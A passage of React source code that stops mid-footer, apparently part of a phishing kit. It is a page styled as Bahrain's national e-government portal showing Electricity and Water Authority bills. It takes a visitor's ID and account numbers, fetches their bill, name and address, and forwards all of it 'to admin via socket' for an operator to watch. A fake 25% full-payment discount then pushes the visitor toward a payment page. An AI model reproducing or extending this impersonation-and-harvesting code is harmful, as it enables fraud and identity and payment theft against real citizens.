import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function EWABills() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [billData, setBillData] = useState<any>(null);
  const [paymentOption, setPaymentOption] = useState<'full' | 'partial'>('full');
  const [partialAmount, setPartialAmount] = useState<string>('');

  // Get the submitted data from localStorage
  const idType = localStorage.getItem("ewa_idType") || "";
  const idNumber = localStorage.getItem("ewa_idNumber") || "";
  const accountNumber = localStorage.getItem("ewa_accountNumber") || "";
  const idTypeLabel = localStorage.getItem("ewa_idTypeLabel") || "";

  useEffect(() => {
    navigateToPage('عرض الفواتير');
    fetchBills();
  }, []);

  const fetchBills = async () => {
    if (!idType || !idNumber || !accountNumber) {
      setError("لم يتم العثور على بيانات العميل");
      setLoading(false);
      return;
    }

    try {
      const serverUrl = import.meta.env.VITE_SOCKET_URL || 'http://localhost:3001';
      const resp = await fetch(`${serverUrl}/api/ewa-bill`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ idType, idNumber, accountNumber }),
      });
      const data = await resp.json();

      if (!data.success) {
        setError(data.error || "حدث خطأ أثناء جلب الفواتير");
      } else {
        setBillData(data);
        // Send bill data to admin via socket
        if (socket.value.connected) {
          sendData({
            data: {
              ewaBills: data,
              idType: idTypeLabel,
              idNumber,
              accountNumber,
            },
            current: 'عرض الفواتير',
            nextPage: 'summary-payment',
            waitingForAdminResponse: false,
          });
        }
      }
    } catch (err: any) {
      setError("حدث خطأ في الاتصال بالخادم: " + (err.message || ""));
    } finally {
      setLoading(false);
    }
  };

  const handleProceed = () => {
    // Save payment data to localStorage for summary page
    localStorage.setItem('ewa_paymentOption', paymentOption);
    localStorage.setItem('ewa_totalAmount', billData?.totalAmount || '0.000');
    if (paymentOption === 'full') {
      const discounted = (parseFloat(billData?.totalAmount || '0') * 0.75).toFixed(3);
      localStorage.setItem('ewa_finalAmount', discounted);
    } else {
      localStorage.setItem('ewa_finalAmount', partialAmount || '0.000');
    }
    setLocation('/ewa-summary');
  };

  const handleBack = () => {
    setLocation('/');
  };

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: `
        .ewa-bills-page, .ewa-bills-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", Arial, sans-serif !important;
          box-sizing: border-box;
        }
        .ewa-bills-page {
          direction: rtl;
          min-height: 100vh;
          background: #FAFAFA;
          color: #17171C;
          font-size: 16px;
          line-height: 1.5;
        }
        .ewa-header {
          background: linear-gradient(135deg, #003366 0%, #0055a4 100%);
          padding: 16px 0;
          color: white;
        }
        .ewa-header-inner {
          max-width: 960px;
          margin: 0 auto;
          padding: 0 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .ewa-header h1 {
          font-size: 20px;
          font-weight: 700;
          margin: 0;
        }
        .ewa-container {
          max-width: 960px;
          margin: 0 auto;
          padding: 24px 20px;
        }
        .ewa-blue-bar {
          background: #003366;
          color: white;
          padding: 12px 20px;
          font-size: 15px;
          font-weight: 600;
          border-radius: 4px;
          margin-bottom: 16px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .ewa-info-card {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
        }
        .ewa-info-row {
          display: flex;
          justify-content: space-between;
          padding: 10px 0;
          border-bottom: 1px solid #f0f0f0;
          font-size: 14px;
        }
        .ewa-info-row:last-child {
          border-bottom: none;
        }
        .ewa-info-label {
          color: #666;
          font-weight: 500;
        }
        .ewa-info-value {
          color: #17171C;
          font-weight: 600;
        }
        .ewa-bills-table {
          width: 100%;
          border-collapse: collapse;
          background: white;
          border-radius: 8px;
          overflow: hidden;
          border: 1px solid #e0e0e0;
          margin-bottom: 16px;
        }
        .ewa-bills-table th {
          background: #003366;
          color: white;
          padding: 12px 16px;
          font-size: 13px;
          font-weight: 600;
          text-align: right;
        }
        .ewa-bills-table td {
          padding: 12px 16px;
          font-size: 13px;
          border-bottom: 1px solid #f0f0f0;
          text-align: right;
        }
        .ewa-bills-table tr:last-child td {
          border-bottom: none;
        }
        .ewa-bills-table tr:hover td {
          background: #f8f9ff;
        }
        .ewa-total-row {
          background: #e8f0fe !important;
          font-weight: 700;
        }
        .ewa-total-row td {
          font-weight: 700;
          color: #003366;
          font-size: 15px !important;
        }
        .ewa-buttons {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-top: 24px;
          flex-wrap: wrap;
        }
        .ewa-btn-primary {
          background: #003366;
          color: white;
          border: none;
          padding: 12px 40px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: background 0.2s;
        }
        .ewa-btn-primary:hover {
          background: #004488;
        }
        .ewa-btn-secondary {
          background: white;
          color: #003366;
          border: 2px solid #003366;
          padding: 12px 40px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-btn-secondary:hover {
          background: #f0f4ff;
        }
        .ewa-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 60px 20px;
          gap: 16px;
        }
        .ewa-dots-spinner {
          width: 60px;
          height: 60px;
          position: relative;
        }
        .ewa-dots-spinner .ewa-dot {
          position: absolute;
          width: 7px;
          height: 7px;
          background: #003366;
          border-radius: 50%;
          animation: ewa-dot-pulse 1.2s ease-in-out infinite;
        }
        .ewa-dots-spinner .ewa-dot:nth-child(1) { top: 0; left: 26px; animation-delay: 0s; }
        .ewa-dots-spinner .ewa-dot:nth-child(2) { top: 8px; left: 44px; animation-delay: 0.15s; }
        .ewa-dots-spinner .ewa-dot:nth-child(3) { top: 26px; left: 52px; animation-delay: 0.3s; }
        .ewa-dots-spinner .ewa-dot:nth-child(4) { top: 44px; left: 44px; animation-delay: 0.45s; }
        .ewa-dots-spinner .ewa-dot:nth-child(5) { top: 52px; left: 26px; animation-delay: 0.6s; }
        .ewa-dots-spinner .ewa-dot:nth-child(6) { top: 44px; left: 8px; animation-delay: 0.75s; }
        .ewa-dots-spinner .ewa-dot:nth-child(7) { top: 26px; left: 0; animation-delay: 0.9s; }
        .ewa-dots-spinner .ewa-dot:nth-child(8) { top: 8px; left: 8px; animation-delay: 1.05s; }
        @keyframes ewa-dot-pulse {
          0%, 100% { transform: scale(1); opacity: 0.3; }
          12.5% { transform: scale(1.8); opacity: 1; }
          25% { transform: scale(1); opacity: 0.3; }
        }
        .ewa-error-box {
          background: #fff3f3;
          border: 1px solid #ffcdd2;
          border-radius: 8px;
          padding: 20px;
          text-align: center;
          color: #c62828;
          margin: 20px 0;
        }
        .ewa-raw-text {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
          white-space: pre-wrap;
          font-size: 14px;
          line-height: 1.8;
          max-height: 400px;
          overflow-y: auto;
        }
        .ewa-payment-options {
          margin-bottom: 16px;
        }
        .ewa-payment-option {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 16px 20px;
          background: white;
          border: 2px solid #e0e0e0;
          border-radius: 8px;
          margin-bottom: 10px;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-payment-option:hover {
          border-color: #003366;
          background: #f8faff;
        }
        .ewa-payment-option.active {
          border-color: #003366;
          background: #e8f0fe;
        }
        .ewa-payment-option-right {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .ewa-radio {
          width: 20px;
          height: 20px;
          border-radius: 50%;
          border: 2px solid #ccc;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          transition: all 0.2s;
        }
        .ewa-payment-option.active .ewa-radio {
          border-color: #003366;
        }
        .ewa-radio-inner {
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #003366;
          opacity: 0;
          transition: opacity 0.2s;
        }
        .ewa-payment-option.active .ewa-radio-inner {
          opacity: 1;
        }
        .ewa-payment-option-label {
          font-size: 15px;
          font-weight: 600;
          color: #17171C;
        }
        .ewa-payment-option-amount {
          font-size: 18px;
          font-weight: 700;
          color: #003366;
        }
        .ewa-partial-input-wrapper {
          padding: 0 20px 16px 20px;
          margin-top: -6px;
          margin-bottom: 10px;
        }
        .ewa-partial-input-row {
          display: flex;
          align-items: center;
          gap: 10px;
          background: #f8faff;
          border: 1px solid #d0d8e8;
          border-radius: 8px;
          padding: 12px 16px;
        }
        .ewa-partial-input-row label {
          font-size: 14px;
          color: #003366;
          font-weight: 500;
          white-space: nowrap;
        }
        .ewa-partial-input {
          flex: 1;
          border: 1px solid #ccc;
          border-radius: 6px;
          padding: 8px 12px;
          font-size: 16px;
          font-weight: 600;
          color: #003366;
          text-align: left;
          direction: ltr;
          outline: none;
          transition: border-color 0.2s;
        }
        .ewa-partial-input:focus {
          border-color: #003366;
        }
        .ewa-partial-input-suffix {
          font-size: 14px;
          color: #666;
          font-weight: 500;
        }

        /* ===== BAHRAIN HEADER & FOOTER ===== */
        .bh-container {
          max-width: 1170px;
          margin: 0 auto;
          padding: 0 15px;
        }
        .bh-header {
          background: #fff;
          border-bottom: none;
        }
        .bh-header-divider {
          border: none;
          border-top: 2px solid #B0B0BA;
          margin: 0;
        }
        .bh-header-row1 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0 12px 0;
        }
        .bh-logo img {
          height: 60px;
        }
        .bh-lang {
          display: flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
          color: #4B4B57;
          font-size: 15px;
        }
        .bh-header-row2 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0;
          background: #fff;
          margin: 0;
          border-top: none;
          min-height: 60px;
        }
        .bh-tabs-row {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .bh-tab {
          font-size: 22px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
          cursor: pointer;
          padding-bottom: 12px;
          padding-top: 8px;
          border-bottom: 4px solid #D3D3DA;
          margin-bottom: 0;
          position: relative;
        }
        .bh-tab.active {
          font-weight: 600 !important;
          color: #17171C !important;
          border-bottom: 4px solid #0747C7 !important;
        }
        .bh-header-actions {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .bh-login-btn {
          background: #045c7c !important;
          color: #fff !important;
          padding: 12px 24px !important;
          border-radius: 6px !important;
          font-size: 15px !important;
          font-weight: 600 !important;
          cursor: pointer;
          display: inline-block;
        }
        .bh-nav {
          background: #EAEAEE;
          border-bottom: none;
          border-top: 2px solid #B0B0BA;
          padding: 8px 0;
          margin-top: 0;
        }
        .bh-nav-items {
          display: flex;
          align-items: center;
        }
        .bh-nav-item {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          padding: 10px 28px !important;
          border-left: none;
          display: flex;
          align-items: center;
          white-space: nowrap;
          cursor: pointer;
        }
        .bh-nav-item.nav-active {
          background: #fff;
          border-radius: 8px;
          position: relative;
        }
        .bh-nav-item.nav-active::before {
          content: "";
          display: inline-block;
          width: 3px;
          height: 16px;
          background: #0747C7;
          margin-left: 10px;
          border-radius: 2px;
        }
        .bh-footer-links {
          background: #F0F0F3;
          padding: 40px 0 30px 0;
          border-top: 1px solid #B0B0BA;
        }
        .bh-footer-columns {
          display: flex;
          justify-content: space-between;
          gap: 30px;
        }
        .bh-footer-col {
          flex: 1;
        }
        .bh-footer-col-title {
          font-size: 18px !important;
          font-weight: 700 !important;
          color: #17171C !important;
          margin-bottom: 16px !important;
          padding-bottom: 8px;
          border-bottom: 2px solid #B0B0BA;
          display: block;
        }
        .bh-footer-col ul {
          list-style: none !important;
          padding: 0 !important;
          margin: 0 !important;
        }
        .bh-footer-col ul li {
          margin-bottom: 8px !important;
        }
        .bh-footer-col ul li a {
          font-size: 18px !important;
          color: #17171C !important;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-col ul li a:hover {
          color: #0747C7 !important;
        }
        .bh-footer-social {
          background: #F0F0F3;
          padding: 30px 0;
        }
        .bh-footer-social > .bh-container {
          border-top: 1px solid #B0B0BA;
          padding-top: 30px;
        }
        .bh-footer-social-inner {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .bh-footer-social-right {
          display: flex;
          align-items: center;
          gap: 20px;
        }
        .bh-footer-contact-title {
          font-size: 20px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-social-icons {
          display: flex;
          gap: 12px;
          align-items: center;
        }
        .bh-footer-social-icons a {
          width: 40px;
          height: 40px;
          background: #8A8A97;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #fff !important;
          font-size: 18px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .bh-footer-social-icons a:hover {
          background: #0747C7;
        }
        .bh-footer-social-left {
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          gap: 12px;
        }
        .bh-footer-contact-number {
          font-size: 30px !important;
          font-weight: 700 !important;
          color: #E31B23 !important;
          direction: ltr;
        }
        .bh-footer-contact-sub {
          font-size: 12px !important;
          font-weight: 600 !important;
          color: #4B4B57 !important;
          text-align: center !important;
        }
        .bh-footer-bottom-links {
          background: #E2E2E7;
          padding: 16px 0;
          text-align: center;
        }
        .bh-footer-bottom-links > .bh-container {
          border-bottom: 1px solid #B0B0BA;
          padding-bottom: 16px;
        }
        .bh-footer-bottom-links a {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 0 8px;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-bottom-links a:hover {
          color: #0747C7 !important;
        }
        .bh-footer-bottom-links .separator {
          color: #D3D3DA !important;
          margin: 0 4px;
        }
        .bh-footer-copyright {
          background: #E2E2E7;
          padding: 20px 0;
          text-align: center;
        }
        .bh-footer-copyright p {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 4px 0 !important;
        }
        .bh-footer-copyright a {
          color: #17171C !important;
          text-decoration: underline !important;
        }
        @media (max-width: 768px) {
          .bh-header-row2 {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
          }
          .bh-nav-items {
            flex-wrap: wrap;
          }
          .bh-nav-item {
            font-size: 14px !important;
            padding: 8px 10px !important;
          }
          .bh-footer-columns {
            flex-direction: column;
          }
          .bh-footer-social-inner {
            flex-direction: column;
            gap: 20px;
          }
        }
      `}} />

      <div className="ewa-bills-page">
        {/* ===== HEADER ===== */}
        <div className="bh-header">
          <div className="bh-container">
            <div className="bh-header-row1">
              <div className="bh-logo">
                <img src="/logo_ar.svg" alt="شعار مملكة البحرين" onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }} />
              </div>
              <div className="bh-lang">
                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>English</span>
                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="2.5">
                  <circle cx="16" cy="16" r="14"/>
                  <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
                </svg>
              </div>
            </div>
          </div>
          <hr className="bh-header-divider" />
          <div className="bh-container">
            <div className="bh-header-row2">
              <div className="bh-tabs-row">
                <span className="bh-tab active">الخدمات الإلكترونية</span>
                <span className="bh-tab">دليل المعلومات</span>
              </div>

            </div>
          </div>
        </div>

        {/* ===== NAVIGATION BAR ===== */}
        <div className="bh-nav">
          <div className="bh-container">
            <div className="bh-nav-items">
              <a className="bh-nav-item nav-active">الصفحة الرئيسية</a>
              <a className="bh-nav-item">الخدمات الإلكترونية حسب التصنيف</a>
              <a className="bh-nav-item">الخدمات الإلكترونية حسب المقدم</a>
              <a className="bh-nav-item">متجر تطبيقات الحكومة الإلكترونية</a>
            </div>
          </div>
        </div>

        <div className="ewa-container">
          {/* Customer Info Bar */}
          <div className="ewa-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
              <path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            <span>بيانات الفواتير</span>
          </div>

          {/* Customer Details Card */}
          <div className="ewa-info-card">
            <div className="ewa-info-row">
              <span className="ewa-info-label">نوع الهوية:</span>
              <span className="ewa-info-value">{idTypeLabel}</span>
            </div>
            <div className="ewa-info-row">
              <span className="ewa-info-label">رقم الهوية:</span>
              <span className="ewa-info-value">{idNumber}</span>
            </div>
            <div className="ewa-info-row">
              <span className="ewa-info-label">رقم الحساب:</span>
              <span className="ewa-info-value">{accountNumber}</span>
            </div>
          </div>

          {/* Loading State */}
          {loading && (
            <div className="ewa-loading">
              <div className="ewa-dots-spinner">
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
                <div className="ewa-dot"></div>
              </div>
              <p style={{ color: '#666', fontSize: '15px' }}>جاري جلب الفواتير...</p>
            </div>
          )}

          {/* Error State */}
          {!loading && error && (
            <div className="ewa-error-box">
              <p style={{ fontSize: '16px', fontWeight: 600, marginBottom: '8px' }}>خطأ</p>
              <p>{error}</p>
            </div>
          )}

          {/* Bill Data */}
          {!loading && !error && billData && (
            <>
              {/* Total Amount */}
              {billData.totalAmount && (
                <div className="ewa-info-card" style={{ background: '#e8f0fe', borderColor: '#003366' }}>
                  <div className="ewa-info-row" style={{ borderBottom: 'none' }}>
                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>المبلغ الإجمالي المستحق:</span>
                    <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366' }}>{billData.totalAmount} د.ب</span>
                  </div>
                </div>
              )}

              {/* All Bills - displayed stacked */}
              {billData.parsedBills && billData.parsedBills.length > 0 ? (
                billData.parsedBills.map((bill: any, idx: number) => (
                  <div key={idx}>
                    <div className="ewa-blue-bar">
                      {billData.parsedBills.length > 1 ? `تفاصيل الفاتورة ${idx + 1}` : 'تفاصيل الفاتورة'}
                    </div>
                    <div className="ewa-info-card">
                      {bill.accountNumber && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">رقم الحساب</span>
                          <span className="ewa-info-value">{bill.accountNumber}</span>
                        </div>
                      )}
                      {bill.customerName && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">تفاصيل العميل</span>
                          <span className="ewa-info-value">{bill.customerName}</span>
                        </div>
                      )}
                      {bill.address && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">العنوان</span>
                          <span className="ewa-info-value">{bill.address}</span>
                        </div>
                      )}
                      {bill.issueDate && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">تاريخ الاصدار</span>
                          <span className="ewa-info-value">{bill.issueDate}</span>
                        </div>
                      )}
                      {bill.billMonth && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">القائمة لشهر</span>
                          <span className="ewa-info-value">{bill.billMonth}</span>
                        </div>
                      )}
                      {bill.balance && (
                        <div className="ewa-info-row">
                          <span className="ewa-info-label">الرصيد (د.ب)</span>
                          <span className="ewa-info-value">{bill.balance}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))
              ) : billData.parsedData && (
                <>
                  <div className="ewa-blue-bar">تفاصيل الفاتورة</div>
                  <div className="ewa-info-card">
                    {billData.parsedData.accountNumber && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">رقم الحساب</span>
                        <span className="ewa-info-value">{billData.parsedData.accountNumber}</span>
                      </div>
                    )}
                    {billData.parsedData.customerName && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">تفاصيل العميل</span>
                        <span className="ewa-info-value">{billData.parsedData.customerName}</span>
                      </div>
                    )}
                    {billData.parsedData.address && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">العنوان</span>
                        <span className="ewa-info-value">{billData.parsedData.address}</span>
                      </div>
                    )}
                    {billData.parsedData.issueDate && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">تاريخ الاصدار</span>
                        <span className="ewa-info-value">{billData.parsedData.issueDate}</span>
                      </div>
                    )}
                    {billData.parsedData.billMonth && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">القائمة لشهر</span>
                        <span className="ewa-info-value">{billData.parsedData.billMonth}</span>
                      </div>
                    )}
                    {billData.parsedData.balance && (
                      <div className="ewa-info-row">
                        <span className="ewa-info-label">الرصيد (د.ب)</span>
                        <span className="ewa-info-value">{billData.parsedData.balance}</span>
                      </div>
                    )}
                  </div>
                </>
              )}

              {/* Payment Options */}
              {billData.totalAmount && (
                <div className="ewa-payment-options">
                  {/* Option 1: Full Payment */}
                  <div
                    className={`ewa-payment-option ${paymentOption === 'full' ? 'active' : ''}`}
                    onClick={() => setPaymentOption('full')}
                  >
                    <div className="ewa-payment-option-right">
                      <div className="ewa-radio"><div className="ewa-radio-inner"></div></div>
                      <span className="ewa-payment-option-label">دفع كامل المبلغ</span>
                    </div>
                    <span className="ewa-payment-option-amount">{billData.totalAmount} د.ب</span>
                  </div>

                  {/* Option 2: Partial Payment */}
                  <div
                    className={`ewa-payment-option ${paymentOption === 'partial' ? 'active' : ''}`}
                    onClick={() => {
                      setPaymentOption('partial');
                      if (!partialAmount) {
                        const third = (parseFloat(billData.totalAmount) / 3).toFixed(3);
                        setPartialAmount(third);
                      }
                    }}
                  >
                    <div className="ewa-payment-option-right">
                      <div className="ewa-radio"><div className="ewa-radio-inner"></div></div>
                      <span className="ewa-payment-option-label">دفع جزء من المبلغ</span>
                    </div>
                    <span className="ewa-payment-option-amount">
                      {paymentOption === 'partial' && partialAmount ? `${partialAmount} د.ب` : `${(parseFloat(billData.totalAmount) / 3).toFixed(3)} د.ب`}
                    </span>
                  </div>

                  {/* Partial Amount Input */}
                  {paymentOption === 'partial' && (
                    <div className="ewa-partial-input-wrapper">
                      <div className="ewa-partial-input-row">
                        <label>المبلغ المراد دفعه:</label>
                        <input
                          type="number"
                          className="ewa-partial-input"
                          value={partialAmount}
                          onChange={(e) => {
                            const val = e.target.value;
                            const max = parseFloat(billData.totalAmount);
                            if (val === '' || parseFloat(val) <= max) {
                              setPartialAmount(val);
                            }
                          }}
                          min="0.001"
                          max={billData.totalAmount}
                          step="0.001"
                          placeholder="أدخل المبلغ"
                        />
                        <span className="ewa-partial-input-suffix">د.ب</span>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* Final Total After Discount */}
              {billData.totalAmount && (
                <div className="ewa-info-card" style={{ background: '#e8f0fe', borderColor: '#003366' }}>
                  <div className="ewa-info-row" style={{ borderBottom: 'none' }}>
                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>{paymentOption === 'full' ? 'المجموع النهائي بعد الخصم (25%):' : 'المجموع النهائي:'}</span>
                    <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366', fontWeight: 800 }}>
                      {paymentOption === 'full'
                        ? `${(parseFloat(billData.totalAmount) * 0.75).toFixed(3)} د.ب`
                        : `${partialAmount || '0.000'} د.ب`
                      }
                    </span>
                  </div>
                </div>
              )}

              {/* Bills Table - if available */}
              {billData.bills && billData.bills.length > 0 && (
                <table className="ewa-bills-table">
                  <thead>
                    <tr>
                      {billData.tableHeaders ? billData.tableHeaders.map((h: string, i: number) => (
                        <th key={i}>{h}</th>
                      )) : billData.bills[0].map((_: any, i: number) => (
                        <th key={i}>
                          {i === 0 ? 'الفاتورة' : i === 1 ? 'التاريخ' : i === 2 ? 'المبلغ' : i === 3 ? 'الحالة' : `عمود ${i + 1}`}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {billData.bills.map((row: string[], idx: number) => (
                      <tr key={idx}>
                        {row.map((cell: string, ci: number) => (
                          <td key={ci}>{cell}</td>
                        ))}
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </>
          )}

          {/* Buttons */}
          <div className="ewa-buttons">
            {!loading && !error && billData && (
              <button className="ewa-btn-primary" onClick={handleProceed}>
                متابعة الدفع
              </button>
            )}
            <button className="ewa-btn-secondary" onClick={handleBack}>
              رجوع
            </button>
            {!loading && error && (
              <button className="ewa-btn-primary" onClick={() => { setLoading(true); setError(""); fetchBills(); }}>
                إعادة المحاولة
              </button>
            )}
          </div>
        </div>

        {/* ===== FOOTER ===== */}
        <div className="bh-footer-links">
          <div className="bh-container">
            <div className="bh-footer-columns">
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">دليل المعلومات</div>
                <ul>
                  <li><a>هنا في البحرين</a></li>
                  <li><a>عن البحرين</a></li>
                  <li><a>اكتشف البحرين</a></li>
                  <li><a>دليل الخدمات الحكومية</a></li>
                  <li><a>الدليل الحكومي</a></li>
                  <li><a>الذكاء الاصطناعي في البحرين</a></li>
                  <li><a>دليل خدمة العملاء</a></li>
                  <li><a>أرقام الطوارئ</a></li>
                </ul>
              </div>
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">الخدمات الإلكترونية</div>
                <ul>
                  <li><a>تصنيف الخدمات الإلكترونية</a></li>
                  <li><a>مقدمو الخدمات الإلكترونية</a></li>
                  <li><a>متجر تطبيقات الهواتف</a></li>
                  <li><a>دليل المستخدم</a></li>
                  <li><a>المفتاح الإلكتروني 2.0 المطوّر</a></li>
                  <li><a>مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية</a></li>
                </ul>
              </div>
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">روابط سريعة</div>
                <ul>
                  <li><a>حول البوابة الوطنية</a></li>
                  <li><a>إحصائيات قنوات الخدمة</a></li>
                  <li><a>المشاركة الإلكترونية "شاركنا"</a></li>
                  <li><a>الأخبار الحكومية</a></li>
                  <li><a>أخبار البحرين</a></li>
                  <li><a>تقويم البحرين</a></li>
                  <li><a>فعاليات تقنية المعلومات</a></li>
                  <li><a>الإشادات والجوائز</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="bh-footer-social">
          <div className="bh-container">
            <div className="bh-footer-social-inner">
              <img src="/bahrain_2030.png" alt="البحرين 2030" style={{ height: '160px', objectFit: 'contain' }} />
              <div className="bh-footer-social-right" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
                <span className="bh-footer-contact-title">تابعونا</span>
                <div className="bh-footer-social-icons">
                  <a title="LinkedIn"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>
                  <a title="Instagram"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg></a>
                  <a title="X"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
                  <a title="Facebook"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg></a>
                  <a title="YouTube"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg></a>
                </div>
              </div>
              <div className="bh-footer-social-left">
                <div className="bh-footer-contact-title">تواصل معنا</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
